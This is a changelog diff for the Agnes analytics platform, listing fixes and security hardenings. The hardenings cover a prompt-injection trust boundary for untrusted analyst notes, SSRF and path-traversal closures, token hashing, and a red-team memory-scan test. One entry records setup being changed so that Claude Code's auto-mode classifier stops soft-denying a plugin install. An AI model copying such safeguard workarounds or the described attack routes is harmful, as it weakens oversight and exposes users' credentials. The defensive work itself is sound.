@@ -35,6 +35,690 @@ CalVer image tags (`stable-YYYY.MM.N`, `dev-YYYY.MM.N`) are produced for every C
   personal items (Profile, AI Connector, My activity, Logout, Theme). All routes
   and permissions are unchanged — every `/admin/*` route is still gated by
   `require_admin`; this is a discoverability/IA change only.
+## [0.74.103] - 2026-07-16
+
+### Fixed
+
+- **Fresh Postgres-backend deployments can boot compose from scratch.** On a brand-new `data` volume the `data-migrate` one-shot in `docker-compose.postgres.yml` found no `system.duckdb` to migrate from, exited 2, and wedged the boot — `app` and `scheduler` gate on it via `service_completed_successfully`. The compose command now passes a new `--missing-source-ok` flag: `python -m scripts.migrate_duckdb_to_pg` treats the missing source as "nothing to migrate" (logged no-op, exit 0), so a fresh deployment proceeds straight to the alembic-seeded PG. Operator-driven runs WITHOUT the flag keep exiting 2 — during a real cutover a missing `system.duckdb` means a mis-mounted volume, not a fresh install — and the flag is rejected in combination with `--reset-target`. Covered by a static compose contract test plus a docker-gated e2e that boots the real overlay chain on fresh volumes (`pytest tests/test_e2e_docker_postgres_fresh.py -m docker`).
+
+## [0.74.102] - 2026-07-16
+
+### Fixed
+
+- **`agnes init` and the recommended launch command no longer trip Claude Code's auto-mode classifier during analyst setup.** `agnes refresh-marketplace --bootstrap` (marketplace clone + plugin install) was soft-denied as "Untrusted Code Integration" under `--permission-mode auto`; `agnes init` now declares the configured marketplace host as trusted internal infrastructure in the user-scope `~/.claude/settings.json` (`autoMode.environment`), derived from config at runtime — never hardcoded. Separately, the `/home` onboarding page's recommended launch command now pre-approves `uv tool install` (setup step 1) via `Bash(uv tool install:*)` in `--allowedTools`, so it no longer requires an interactive permission prompt. Existing installs pick up the trust on their next `agnes init`; wiring it into `agnes update` for installs that never re-run init is a tracked follow-up.
+
+## [0.74.101] - 2026-07-16
+
+### Fixed
+
+- Built-in marketplace plugins (`agnes-analyst`, `agnes-operator`) now ship
+  their `SKILL.md` at the canonical `plugins/<name>/skills/<name>/SKILL.md`
+  path instead of the plugin root. At the root the file was discovered by
+  nothing: Claude Code loaded no skill from the installed plugin, and
+  `list_inner_skills()` returned `[]`, so both plugins contributed zero
+  skills to the marketplace listing and the served feed despite installing
+  and being granted correctly. Users who already installed either plugin
+  pick the skill up on the next `agnes refresh-marketplace` (or session
+  start).
+
+## [0.74.100] - 2026-07-16
+
+### Added
+
+- **Search responses now label the retrieval mode** (#898): `GET /api/collections/search`, `GET /api/knowledge/search`, and the MCP tools `collections_search` / `knowledge_search` (both transports, including the stdio offline fallback) carry a `retrieval: "hybrid" | "lexical_only"` field. Previously the lexical-only degradation that kicks in without the `agnes[embeddings]` extra was visible only in a server-side log line, so a client could not tell semantic-scored results from degraded ones.
+
+### Fixed
+
+- Catalog `fetch_via` hint for internal tables (`agnes_audit`, `agnes_sessions`, `agnes_telemetry`) no longer claims "already local" (#898) — on a fresh workspace no local view exists until the usage export lands in the pull manifest, so the old hint misrouted clients into a failing local query. It now points at the auto-routing `agnes query`.
+- MCP `describe` docstrings (stdio + server-side foundation tool) now document the actual sample shape (#898): `sample.rows` is a list of `{column: value}` objects and there is no `sample.columns` key — the docstring previously promised `{"columns": [...], "rows": [...]}`, which broke agents parsing the documented shape on empty tables.
+
+## [0.74.99] - 2026-07-16
+
+### Added
+
+- Container CPU caps in `docker-compose.yml` are now env-overridable, mirroring the existing `AGNES_APP_MEM_LIMIT` pattern: `cpus: ${AGNES_APP_CPUS:-2.0}` (app) and `${AGNES_SCHEDULER_CPUS:-1.0}` (scheduler), settable per deployment in `.env` instead of editing the compose file (live edits are lost on VM recreate). The `customer-instance` Terraform module grows matching `app_cpus` / `scheduler_cpus` instance attributes (defaults unchanged) that flow into `/opt/agnes/.env` via the startup script.
+
+## [0.74.98] - 2026-07-16
+
+### Fixed
+
+- **`agnes auth import-token` no longer fails a valid PAT when server-side verification is merely slow or transiently erroring.** The verification call (against `/api/catalog/tables`) hard-exited on any `5xx` and used a hard-coded 15s timeout, so a momentarily loaded or flapping endpoint turned a structurally-valid token into a failed install. Now only a definitive rejection (`401`) aborts; a `5xx` or a read timeout warns and proceeds to save the token (it already decoded locally and was not rejected — same posture as `--skip-verify`), while a genuine connection failure (bad URL / server down) still aborts. The timeout is configurable via `AGNES_VERIFY_TIMEOUT` (seconds; falls back to the 15s default on an unset, non-numeric, or non-positive value). `cli/commands/auth.py`.
+
+### Added
+
+- `SESSION_PROCESSOR_MAX_PER_RUN` (default 50) caps how many sessions a
+  single `/api/admin/run-session-processor` invocation processes; the rest
+  are deferred to the next scheduler tick instead of running unboundedly in
+  one request. Bounds the worst-case wall-clock/CPU cost of a burst of
+  session closures landing in the same tick (each candidate can trigger
+  multiple synchronous LLM calls). The response/audit-log stats gained a
+  `capped` field reporting how many sessions were deferred. Complements the
+  per-session time budget added for the verification processor in 0.74.97 —
+  this caps how many *sessions* a run touches, that caps how long *one*
+  session's item loop can run. Applied to `verification` (and any future
+  processor) by default; `usage` is exempt — pure local jsonl parsing +
+  repository writes with no LLM/network calls, so capping it would only
+  throttle telemetry throughput (e.g. draining a bulk backfill slowly)
+  without any wall-clock/CPU safety benefit.
+- `SCHEDULER_VERIFICATION_SCHEDULE` lets an operator pin the LLM-heavy
+  verification session-processor to a fixed off-peak time (e.g.
+  `"daily 04:15"`) instead of firing every N minutes/hours — useful when
+  daytime CPU contention with request-serving matters more than
+  near-real-time verification freshness. Falls back to the existing
+  interval-derived cadence when unset or invalid. Pair with a matching
+  `SCHEDULER_VERIFICATION_DETECTOR_INTERVAL` bump so the liveness probe's
+  staleness-warning grace window stays calibrated to the real cadence.
+
+## [0.74.97] - 2026-07-16
+
+### Added
+
+- `security.ssrf_allowed_hosts` (env `AGNES_SSRF_ALLOWED_HOSTS`): operator
+  allowlist of hostnames exempt from the private/reserved-network SSRF guard.
+  The check lives in the shared `_validate_url_not_private`, so a listed host is
+  exempt on **every** admin-configured URL that routes through it — marketplace
+  + initial-workspace clone URLs, the Keboola `stack_url`, and URL-bearing
+  server-config fields (`data_source.keboola.stack_url`, `marketplace.curators_url`)
+  — not just clone URLs. The motivating case is registering a marketplace hosted
+  on an internal git server (e.g. an on-prem GitHub Enterprise on a private
+  network). Accepts a YAML list or a comma-separated string; empty by default,
+  so the guard stays fail-closed for every host not listed.
+
+### Changed
+
+- `/marketplace.git/*` smart-HTTP serving now shells out to the real `git
+  http-backend` CLI binary as a subprocess (CGI protocol) instead of
+  dulwich's pure-Python `HTTPGitApplication` bridged over WSGI. Under a
+  single-process deployment (required — DuckDB allows only one writer per
+  file, so `--workers` can't be used), dulwich's CPU-heavy pack generation
+  held the GIL for seconds even while "offloaded" to a thread pool, starving
+  the event loop and stalling health checks and other requests during large
+  git-marketplace fetches. The real subprocess fully releases the GIL during
+  pack generation. Repo building/caching (`git_backend.py`) and auth
+  (`resolve_token_to_user`) are unchanged.
+
+### Fixed
+
+- **`use_pg()` re-parsed the state overlay YAML on every repo access.**
+  Each `*_repo()` factory call ran `use_pg()` → `read_backend_state()` →
+  uncached `yaml.safe_load()` of `$DATA_DIR/state/instance.yaml`, so a single
+  RBAC/catalog request parsed the overlay dozens of times. Pure-Python PyYAML
+  holds the GIL, serializing the single-uvicorn event loop and capping catalog
+  throughput at ~2 req/s per instance (py-spy: ~48% of request CPU in
+  `yaml.safe_load`). `read_backend_state()` now memoizes the parsed overlay for
+  the process lifetime — correct without an mtime guard because a backend flip
+  runs the migrator as a subprocess and restarts the app (fresh process → cold
+  cache). `write_backend_state()` invalidates the cache and a public
+  `reset_backend_state_cache()` (wired into `reset_database_cache()`) is the
+  explicit invalidation hook. `src/db_state_machine.py`.
+- Every route handler in `app/api/catalog.py`, `app/api/claude_md.py`, and
+  `app/api/sync.py` was declared `async def` but did purely blocking
+  synchronous DB/FS work with no `await` — so on the single uvicorn worker it
+  ran directly on the event loop, and one slow request (e.g. a Postgres
+  round-trip) froze every concurrent request and could stall the health probe
+  into an edge failover. Converted all of them to plain `def` so FastAPI
+  offloads them to the thread pool, matching `/api/v2/catalog`. Covers the
+  hot paths (`/api/catalog/tables`, `/api/welcome`, `/api/sync/manifest`) plus
+  the lower-traffic siblings (profile, admin workspace-template, sync
+  settings / table-subscriptions, pull-confirm). No payload change.
+- **Verification session processor no longer runs unbounded, starving the app under load.** `VerificationProcessor.process_session()` looped over every extracted verification item in a session with no cap, running one inline (blocking) LLM contradiction check per item; a single scheduled run against a session with dozens of items could run for over an hour inside a synchronous admin endpoint, exhausting the FastAPI threadpool and causing app-wide 503s on unrelated endpoints. `process_session()` now enforces a wall-clock time budget (180s) on its item loop: once exceeded it raises instead of returning, so — per the existing `SessionProcessor` contract — the session is left unprocessed and its remaining items are picked up on the next scheduler tick (cadence stays 15 minutes) rather than the run monopolizing the process indefinitely. Items already created on a prior tick no longer get a duplicate evidence row appended on retry — the duplicate-item branch now skips `create_evidence()` when evidence for the same `(source_user, source_ref)` was already recorded, so a session that spans multiple retries doesn't inflate its earliest items' confirmation count.
+- **Keyless chat auth: admin "test connection" + operator docs.** Follow-up to
+  the workload-identity LLM auth (0.74.95): the admin `POST
+  /api/admin/chat/secrets/test` probe now works in `workload_identity` mode —
+  it mints a federated token and runs a 1-token completion
+  (`readiness.test_wif_credentials`), the keyless analog of the static-key test,
+  so operators aren't left with only a runtime error as feedback. Auto-title
+  generation now also picks its credential off `chat_config.llm_auth` instead
+  of only checking for a static key's presence, so a stale `ANTHROPIC_API_KEY`
+  left set in `workload_identity` mode can no longer make it silently
+  authenticate with the wrong credential. Adds
+  [`docs/chat-keyless-auth.md`](docs/chat-keyless-auth.md) — the operator setup
+  guide (federation rule, env, config switch, verification, troubleshooting).
+- Skill curation linter (v91, #687) — advisory craft review for store skills, complementing the hard spam/safety guardrails. Rules: SL002 (body bloat), SL010 (holistic LLM craft review — trigger clarity, single-purpose, duplicate confirmation), with SL011/SL012 degraded heuristics when no LLM key is set. Duplicate detection uses an in-memory FTS index over the published-skill corpus (name + description + body). Surfaced everywhere: `POST /api/store/entities/from-markdown` accepts `dry_run: true` and `POST /api/store/entities/dryrun` returns a `lint` block; the Skill Builder and classic upload page show findings before publishing; every publish runs a background post-publish lint; the skill's edit page shows the owner its latest findings. Admin curation at `/admin/store/lint` plus `GET /api/admin/store/lint-findings`, `POST /api/admin/store/lint-audit` (full-corpus re-lint, skips unchanged skills, rate-limited by `guardrails.lint_audit_min_interval_hours` unless `force: true`), and `POST /api/admin/store/lint-dismiss` — mirrored to `agnes admin store lint-{findings,audit,dismiss}` and the `admin_store_lint_*` MCP tools. A weekly scheduler job runs the audit. Best-practice guidance lives in `docs/skill-guidelines.md`. Purely advisory — never blocks publication or changes `visibility_status`. The upload wizard's advisory-lint preview passes `lint_only=true` to `/entities/dryrun` so previewing findings on reaching step 2 never bills the paid LLM security review (which the real publish path schedules separately).
+
+---
+
+## [0.74.96] - 2026-07-15
+
+### Fixed
+
+- Intermittent **"system unavailable"** (503) responses under load. The
+  auth/RBAC request dependencies (`get_current_user`, `get_optional_user`,
+  `require_session_token`, `require_admin`, `require_resource_access`,
+  `require_broker_ticket`) were `async def` but ran synchronous, blocking
+  state-DB reads directly on the single uvicorn event loop; since auth runs on
+  nearly every request, one slow read could freeze the whole process. They are
+  now plain `def` so FastAPI offloads them to the anyio thread pool.
+- On a Postgres-backed instance the system DuckDB is no longer opened. System
+  state lives in Postgres, but several request/startup paths still opened the
+  local `system.duckdb`, creating a stale file and reading the wrong backend.
+  `get_system_db()` now raises on a Postgres instance and every opener is gated
+  behind the backend selector or routed through the repository factory. The
+  DuckDB-only operational tables with no Postgres mirror (`cli_auth_codes`,
+  Slack identity-binding codes) moved to a dedicated `operational.duckdb`.
+- Unauthenticated pages (`/login`, `/first-time-setup`, `/login/password`) no
+  longer render the admin install-prompt override on a Postgres instance. The
+  setup-prompt branch keyed off `use_pg()` alone, so on Postgres — where a
+  supplied request conn is always `None` — anonymous pages entered the
+  DB-backed override path instead of the anonymous default (a divergence from
+  DuckDB). `_build_context` now distinguishes "caller omitted conn" from
+  "caller supplied conn", so anonymous pages get the default on both backends.
+- `agnes admin metrics {import,export,validate}`, `agnes admin metadata-apply`,
+  and `agnes admin break-glass-grant-admin` no longer crash on a Postgres
+  instance. Each opened a vestigial system-DuckDB connection (never used — the
+  work routes through the repository factory), which hard-raised once
+  `get_system_db()` began rejecting Postgres. The call is now gated behind
+  `not use_pg()`.
+- `close_singleton_connections()` (run before a migrator subprocess spawns to
+  release DuckDB file locks) now also closes the new `operational.duckdb`
+  singleton, so its exclusive file lock is not held across the spawn.
+- Startup bootstrap-warning no longer leaks a DuckDB cursor if the user-list
+  read raises: the connection close moved into a `try/finally`.
+- CLI-login (`/cli/auth/{start,exchange}`) and Slack identity-binding requests
+  no longer leave the `operational.duckdb` cursor unclosed on a Postgres
+  instance. The `operational.duckdb` fallback in `_cli_auth_repo` /
+  `_binding_conn` is now a context manager that closes the cursor it opens on
+  exit (the request-scoped DuckDB conn is still closed by `_get_db`).
+- Schema cache warmup (`_warm_schema_sync`) no longer opens a system-DuckDB
+  cursor per warmed table. `build_schema_uncached` never uses the passed conn
+  on the remote path warmup takes, so the handle was leaked (unclosed) on every
+  table on DuckDB; it now passes `None`, matching `warm_one_table`.
+- Non-admin internal-table queries no longer leak a DuckDB cursor. The
+  backend-aware `_state_table_denylist()` opened a `get_system_db()` cursor on
+  the DuckDB path without closing it; it now stores and closes it in a
+  `try/finally`, matching the sibling `get_schema()`.
+
+---
+
+## [0.74.95] - 2026-07-15
+
+### Added
+
+- **Keyless chat LLM auth via Workload Identity Federation (opt-in).** A new
+  `chat.llm.auth` setting (`api_key` default | `workload_identity`) lets the
+  chat broker authenticate to Anthropic with a **short-lived token minted from
+  the workload's own OIDC identity** instead of a static `ANTHROPIC_API_KEY` —
+  no long-lived key anywhere. In `workload_identity` mode the broker's Anthropic
+  proxy injects `Authorization: Bearer <federated token>` (+ the oauth beta
+  header) instead of `x-api-key`; the token is minted via Anthropic's native WIF
+  exchange (`app/auth/wif.py`, `POST /v1/oauth/token`, RFC 7523 jwt-bearer),
+  cached and refreshed, reading the standard `ANTHROPIC_FEDERATION_*` /
+  `ANTHROPIC_IDENTITY_TOKEN[_FILE]` env. Default stays `api_key`, so existing
+  installs are unaffected. The sandbox still never holds any credential
+  (INC-01572 preserved — there is no long-lived key to leak, even server-side).
+  Operator setup (federation rule + identity-token source) is deployment config;
+  design in `docs/superpowers/specs/2026-07-15-keyless-llm-auth-design.md`.
+
+---
+
+## [0.74.94] - 2026-07-15
+
+### Fixed
+
+- RBAC N+1 in catalog (`/api/v2/catalog`, `/api/catalog`), sync manifest
+  build, knowledge search, web router (chat snapshot, library, table detail),
+  recipes, and collections endpoints — each resolved the caller's accessible
+  set once per request instead of calling `can_access_table`/`can_access` per
+  row (600+ Postgres round-trips collapsed to ~6; 30-40s down to <1s under
+  concurrency, removing a 503-under-load trigger).
+
+### Internal
+
+- Added `src.rbac.get_accessible_ids`, a grant-set helper (DuckDB↔PG parity)
+  used by the RBAC N+1 fixes above.
+
+---
+
+## [0.74.93] - 2026-07-15
+
+### Fixed
+
+- Keboola connector data-sync reliability (found via live end-to-end verification against a real project):
+  - Legacy CSV extraction (`query_mode='local'` fallback path) no longer trusts a sliced export manifest's raw `entries` array order when concatenating slices — entries are now re-sorted by a natural (numeric-aware) key parsed from each slice's URL before download, so an out-of-order manifest can no longer land a data slice ahead of the header slice and corrupt the resulting parquet's column names.
+  - Materialized (`query_mode='materialized'`) native-parquet sync now applies the same Keboola-metadata-derived PyArrow schema the legacy CSV path already used (the "v27 typed-parquet fix"), instead of leaving every column string-typed the way Storage API's native Snowflake UNLOAD export serves them.
+
+---
+
+## [0.74.92] - 2026-07-15
+
+### Fixed
+
+- Keboola semantic layer importer: metrics whose Keboola SQL fragment carries an embedded `--` comment (e.g. an author note flagging a missing table or an unapplied filter) are now skipped and counted (`skipped_embedded_comment`) instead of silently emitting broken SQL — appending the composed `FROM` clause after such a comment let SQL treat it as part of the comment, dropping the `FROM` clause entirely. Found via live end-to-end verification against a real project.
+
+---
+
+## [0.74.91] - 2026-07-15
+
+### Internal
+
+- **INC-01572 red-team coverage — process-memory leg.** Added
+  `tests/e2e/test_adversarial.py::test_no_real_anthropic_key_in_process_memory`
+  (e2b-tier, `real_llm`): with full in-sandbox code execution (the post-prompt-
+  injection threat model), scans every same-UID process's memory via
+  `/proc/<pid>/mem` after a live completion and asserts the real Anthropic key
+  is absent from ALL process memory — including the runner/relay that proxies
+  the (ticketed) call. Complements `test_no_secret_anywhere` (env/argv/fs) with
+  the strongest attacker vector the suite otherwise left untested. A self-canary
+  is the positive control so a blocked memory read can't pass vacuously. Verified
+  green against a live sandbox (`SCANNED_PIDS=3, CANARY_FOUND=True, no key`).
+
+---
+
+## [0.74.90] - 2026-07-15
+
+### Fixed
+
+- **Chat P0 — CLI data tools and MCP tools returned `HTTP 405` inside chat.**
+  The in-sandbox relay forwarded `/agnes-api` and `/agnes-mcp` requests to the
+  broker verbatim — native method + sub-path in the URL — but the broker's
+  replay routes only serve the exact `/agnes-api` / `/agnes-mcp` paths and
+  expect a `{method, path, body}` JSON envelope (the native HTTP method is lost
+  because the relay always POSTs). So every `agnes catalog`/`query`/… CLI call
+  and every Agnes MCP tool call arrived as `POST /api/broker/agnes-api/<subpath>`
+  and 405'd, leaving the chat agent unable to read any data. The relay now
+  wraps `/agnes-api` and `/agnes-mcp` calls into the envelope the broker
+  expects (carrying the native method, sub-path with query string, and parsed
+  JSON body); `/anthropic` stays a transparent external proxy. Unit tests
+  encoded only the envelope path, so this integration gap was invisible until
+  live E2E.
+
+---
+
+## [0.74.89] - 2026-07-15
+
+### Fixed
+
+- **Chat P0 — UI-rotated `ANTHROPIC_API_KEY` / `E2B_API_KEY` silently lost on
+  restart.** The `.env_overlay` boot-load in `create_app` used
+  `os.environ.setdefault`, so any secret the admin set via the "configure
+  secrets" UI (which persists to the overlay) was **discarded on the next
+  restart** whenever a same-named value was already baked into the container
+  env — the stale baked key won and chat failed with a 401 (`API key is
+  invalid`). The overlay is the admin's persisted runtime configuration and now
+  **overrides** the baked env, matching `persist_overlay_token`'s own
+  `os.environ[k] = v` write semantics. Set the key once in the UI; it now wins
+  consistently across restarts.
+
+---
+
+## [0.74.88] - 2026-07-15
+
+### Added
+
+- Keboola semantic layer importer: `connectors/keboola/semantic_layer.py` syncs a Keboola project's Metastore (datasets, metrics, constraints) into `metric_definitions` on a schedule (`SCHEDULER_KEBOOLA_SEMANTIC_LAYER_REFRESH_INTERVAL`, default 6h), tagged `source='keboola_semantic_layer'` and upsert+pruned each run. Requires a master (owner) Storage API token. Metrics referencing a JOINed dataset (via an aliased column not in scope for v1) are skipped and counted rather than guessed. A failed Metastore fetch or Storage API master-token preflight (401/5xx/network) aborts with a logged `{status: error}` instead of a 500; an empty upstream metrics response never prunes the entire existing row set (safety valve against upstream filter drift); and foreign-alias detection masks single-quoted string literals so a dotted enum value like `'in.progress'` no longer skips a valid single-table metric.
+
+---
+
+## [0.74.87] - 2026-07-15
+
+### Fixed
+
+- **Chat P0 — LLM completions timed out, agent returned empty responses.** Both
+  httpx clients on the sandbox→server→Anthropic path (the in-sandbox relay's
+  outbound client and the broker's `/anthropic` proxy client) were constructed
+  with httpx's 5-second default read timeout. Real Claude completions routinely
+  run for tens of seconds to minutes, so every one aborted with
+  `httpx.ReadTimeout` — the broker leg first, then (once that was fixed) the
+  relay leg waiting on the broker — leaving the sandbox agent with an empty
+  assistant message even though auth and credential isolation were correct.
+  Both clients now use a generous read timeout (`read=600s`) while keeping
+  connect/write/pool bounded so a dead upstream still fails fast. Regression
+  tests assert each client is built with a read timeout well above the 5s
+  default.
+
+---
+
+## [0.74.86] - 2026-07-15
+
+### Fixed
+
+- **Chat readiness probe:** the admin "test E2B connection" diagnostic
+  (`app/chat/readiness.py:test_e2b_key`) crashed with `TypeError: object
+  AsyncSandboxPaginator can't be used in 'await' expression` on the modern e2b
+  SDK. `AsyncSandbox.list()` is a synchronous factory returning an
+  `AsyncSandboxPaginator`, not a coroutine — the authenticated round trip
+  happens when the first page is awaited. The probe now awaits
+  `paginator.next_items()` instead of the factory. The test fakes previously
+  mocked `list` as a coroutine, which masked the bug; they now mirror the real
+  SDK contract (sync `list()` → non-awaitable paginator → async
+  `next_items()`), so a regression to `await list(...)` re-triggers the
+  production `TypeError` in CI.
+
+---
+
+## [0.74.85] - 2026-07-15
+
+### Fixed
+
+- **Security:** the SSE (`/api/mcp`) and Streamable-HTTP MCP transports now
+  filter `tools/list` by the caller's `tool_grants`, closing a visibility leak
+  left by the invocation-time gate. The transports register every enabled
+  passthrough tool once at startup, so `tools/list` previously advertised all
+  of them — names, descriptions, and input schemas — to any authenticated
+  caller regardless of grants (invocation was already gated, but visibility was
+  not). Listing now mirrors the REST `_visible_passthrough_tools` intersection:
+  admins see all passthrough tools, everyone else only those their groups are
+  granted, and an unresolved caller sees none. The hide-set is fixed at install
+  time from the registered tool names, so a runtime grant-resolution error
+  fails closed (hides every passthrough tool) rather than leaking the
+  unfiltered list. Foundation tools are never passthrough-mode and stay
+  visible.
+
+---
+
+## [0.74.84] - 2026-07-15
+
+### Security
+
+- OAuth 2.1 authorization codes, access tokens, and **refresh tokens** are now
+  hashed (SHA-256) at rest in `oauth_auth_codes` / `oauth_access_tokens` /
+  `oauth_refresh_tokens` (both DuckDB and Postgres repos), instead of stored
+  verbatim. A read of `system.duckdb`/PG previously yielded live refresh
+  tokens — 30-day secrets exchangeable via `grant_type=refresh_token` for a
+  fresh full-RBAC session JWT (audit M4). Hashing happens in the repo layer
+  (store + lookup both hash), so the authorization-code / refresh exchange
+  flows are unchanged; tokens issued before the upgrade are invalidated.
+  NOTE: `client_secret` is deliberately NOT hashed here — the MCP OAuth SDK
+  compares it by equality against the value returned in
+  `OAuthClientInformationFull`, so hashing it at rest needs an SDK-side
+  verification change and is tracked as a follow-up.
+
+## [0.74.83] - 2026-07-15
+
+### Security
+
+- `/api/query` and `/api/v2/scan` (`from_query`) now deny non-admin references
+  to the internal extract-catalog base tables `_meta`, `_remote_attach`, and
+  `_remote_links`. Each source's `extract.duckdb` is ATTACHed as a catalog, so
+  a non-admin could reach those base tables via a catalog-qualified path
+  (`<ungranted_source>.main."_remote_attach"`) — they aren't VIEWs, so they
+  slipped past the master-view-name denylist — leaking cross-source schemas,
+  row counts, and (for remote sources) the upstream URL and `token_env`
+  variable name. These tables are orchestrator-internal and never part of an
+  analyst's query surface. Found by the post-INC-01572 audit (M1). NOTE: the
+  broader cross-source catalog-qualified *row* access (name-collision case) is
+  tracked for a follow-up query-authorization allowlist redesign — this change
+  closes the sensitive metadata/credential-name leak.
+
+## [0.74.82] - 2026-07-15
+
+### Fixed
+
+- **Chat sandbox runner crashed at startup**, taking chat down end-to-end. The
+  broker hardening added a module-level `from app.chat.relay import Relay` to
+  `app/chat/runner.py`, but the runner executes as a standalone script inside
+  the E2B sandbox where the `app` package does not exist until
+  `_install_agnes_cli()` pip-installs the uploaded wheel — so the import raised
+  `ModuleNotFoundError: No module named 'app'` at interpreter startup, before
+  the install ran. The relay import is now lazy (inside `_start_relay()`), the
+  annotation is `TYPE_CHECKING`-only, and `amain()` runs `_install_agnes_cli()`
+  before `_start_relay()` (the install is an offline `pip install --no-deps`
+  of the local wheel — no network/broker needed). A guard test rejects any
+  module-level `app.*` import in the runner. Found by live E2E on agnes-dev
+  (the deny_out egress fix let sandboxes spawn, which unmasked this).
+
+## [0.74.81] - 2026-07-15
+
+### Security
+
+- Marketplace and initial-workspace clone URLs are now run through
+  `_validate_url_not_private` (DNS-resolve + reject private/reserved/loopback/
+  link-local hosts), matching the guard the other admin URL fields already use.
+  These URLs are `git clone`d server-side on the nightly sync, so an
+  admin-registered `https://169.254.169.254/…` or internal host was a
+  server-side SSRF / internal port-probe vector (admin-gated → defense in
+  depth). Found by the post-INC-01572 audit (L2).
+
+## [0.74.80] - 2026-07-15
+
+### Added
+
+- The guided web tour now includes the global header search box ("Search everything") — one step between Memory and the admin menu, explaining the cross-source search (tables + knowledge + documents) and its origin-labeled results.
+
+---
+
+## [0.74.79] - 2026-07-15
+
+### Security
+
+- Curated-marketplace file serving: two path/RBAC gaps from the post-INC-01572
+  audit are closed. (M2) `curated_doc` authorized on `{marketplace_id}/{plugin_name}`
+  but served a repo-root-relative path, so a grant to one plugin could read a
+  sibling plugin's docs in the same marketplace — the served file is now
+  required to live under the granted plugin's `plugins/{plugin_name}/` subtree
+  (marketplace-shared paths outside any `plugins/<x>/` stay accessible). (L1)
+  `marketplace_id` / `plugin_name` path params were used verbatim to build the
+  served root, so a `..` escaped the marketplaces dir (and `_safe_join`
+  re-anchored on the escaped root), letting a login-only caller read image
+  files elsewhere under `DATA_DIR`; the segments are now validated as strict
+  slugs (`..`, `/`, `\` rejected) on the asset, doc, and mirrored endpoints.
+
+## [0.74.78] - 2026-07-15
+
+### Fixed
+
+- **Chat sandbox spawn was hard-down** on `e2b>=2.32.0`: the VM egress config
+  passed `allow_out` without `deny_out`, and the E2B API now rejects that with
+  `400: when specifying allowed domains in allow out, you must include
+  'ALL_TRAFFIC' in deny out to block all other traffic` — so every
+  `AsyncSandbox.create` raised and no chat session could start. Now sets
+  `deny_out=[ALL_TRAFFIC]` alongside the allow-list. This also makes the egress
+  allow-list actually enforce: without a matching deny, the allow-list blocked
+  nothing (egress was effectively a no-op), so this restores the INC-01572
+  Phase-1 VM-level egress control as well as unbreaking spawn. Caught by live
+  end-to-end testing — unit tests mock the E2B API and can't see the contract
+  change.
+
+## [0.74.77] - 2026-07-15
+
+### Security
+
+## [0.74.76] - 2026-07-15
+
+### Security
+
+- Corporate-memory curator: the LLM prompt that ingests every analyst's
+  untrusted `CLAUDE.local.md` now enforces a trust boundary. The notes are
+  wrapped in `<untrusted_notes>` sentinels (which are neutralized in the note
+  bodies so a note can't forge/close them) and a `system=` trust-boundary
+  prompt rides the model's separate system channel, matching the pattern the
+  store-guardrails path already used. Without this, a note whose body reads as
+  curator instructions could poison the shared, auto-published knowledge base
+  (worm-like cross-user prompt injection / note exfiltration) — an INC-01572
+  class recurrence found by the follow-up audit. Operators on the legacy
+  auto-approve default (no `corporate_memory` governance block) should switch
+  to a `review_queue` to keep a human gate on new items.
+
+### Internal
+
+- `StructuredExtractor.extract_json` gained an optional `system=` trust-boundary
+  argument across all providers (Anthropic already had it; added to the base
+  interface and the OpenAI-compatible provider) so untrusted-content callers
+  can keep rules on the model's system channel.
+
+---
+
+## [0.74.75] - 2026-07-15
+- Password-reset, account-setup, and email magic-link tokens are now hashed
+  (SHA-256) at rest instead of stored verbatim in the `users` table, matching
+  the hash-at-rest standard already used for PATs and setup/broker tokens.
+  Previously anyone who could read `system.duckdb` (a backup, a snapshot, an
+  objectViewer on the state bucket) could replay a live one-time token for
+  account takeover. The raw token now exists only in the emailed link; the DB
+  holds only the digest, and the incoming token is hashed before comparison.
+  In-place in the existing columns — no schema change; outstanding (short-TTL)
+  tokens issued before the upgrade are invalidated and must be re-requested.
+  Found by the post-INC-01572 audit (M3).
+
+### Fixed
+
+- Chat sandbox: the in-memory legacy-resume path (`_resume_live`) now destroys
+  the old paused sandbox **and revokes its broker tickets** before
+  force-respawning, mirroring the post-restart path (`_resume_from_row`) and
+  the non-legacy resume. Without it, resuming a session this process never
+  pushed a current-protocol ticket to overwrote `sandbox_id` via a fresh spawn
+  and orphaned the paused E2B microVM until its absolute TTL — a billing leak —
+  while the old session's tickets stayed redeemable for the rest of their TTL
+  (Devin review follow-ups on #849/#851).
+
+---
+
+## [0.74.74] - 2026-07-15
+
+### Added
+
+- **Chat sandbox secret broker.** The real Anthropic key and Agnes token are
+  no longer placed in any chat-sandbox process environment. An in-sandbox
+  loopback relay holds only opaque, short-lived, session-scoped tickets (in
+  memory — never in env or on disk) and forwards to internal broker routes
+  (`/api/broker/{anthropic,agnes-api,agnes-mcp}`) that inject the real
+  credentials server-side. Agnes-API/MCP requests are replayed in-process
+  through the app's own stack, so live per-request RBAC applies. Tickets
+  (`chat_broker_tickets`, schema v90) are minted at spawn, pushed to the runner
+  over stdin, re-minted (old ones revoked) on resume, and revoked on session
+  teardown; each expires at its TTL (default 1h). Complements the VM-level
+  egress allowlist (0.74.70): egress stops exfiltration, the broker stops
+  credential theft.
+
+### Changed
+
+- Chat sessions no longer receive the real Anthropic key or Agnes token in
+  their sandbox (or `agnes mcp` subprocess) environment; credentials are
+  brokered. The `agnes mcp` subprocess rides a separate mcp-scoped ticket.
+
+### Fixed
+
+- Cap FastAPI below 0.137.0. That release regressed `include_router` so it no
+  longer copies the source router's routes into the app (adds zero routes),
+  leaving `create_app()` with no `/api` routes. Harmless in production, but it
+  broke the test suite's fresh app builds — and only on Python 3.13, where the
+  resolver otherwise picks a >=0.137 release. Bisected: 0.136.0 OK, 0.137.0
+  broken. Lift once verified against the new behavior.
+
+### Internal
+
+- Schema v90: `chat_broker_tickets` table (DuckDB `_v89_to_v90` + Alembic
+  `0037_chat_broker_tickets_v90`), dual-backend `ticket` repository.
+- Broker admin-mutation gate introspects the target route's `require_admin`
+  dependency (not a path prefix), so admin routes off `/api/admin/`
+  (`/api/users/*`, `/auth/admin/tokens/*`, `/api/sync/trigger`, …) are refused
+  regardless of the resolved identity. Co-session tickets resolve via
+  `mint_co_session_jwt` (live grant-intersection). Post-restart resume destroys
+  the old paused sandbox before clearing its ref (no microVM leak).
+- Broker replay path is canonicalized into the exact URL the ASGI transport
+  dispatches on (percent-decoded, dot-segments collapsed), and the admin gate
+  reads its path from that *same* URL object — so the gate and the dispatch
+  cannot diverge for any encoding. An absolute-URL, protocol-relative
+  (`//host`), backslash, `%2f`-encoded authority, interior percent-encoding
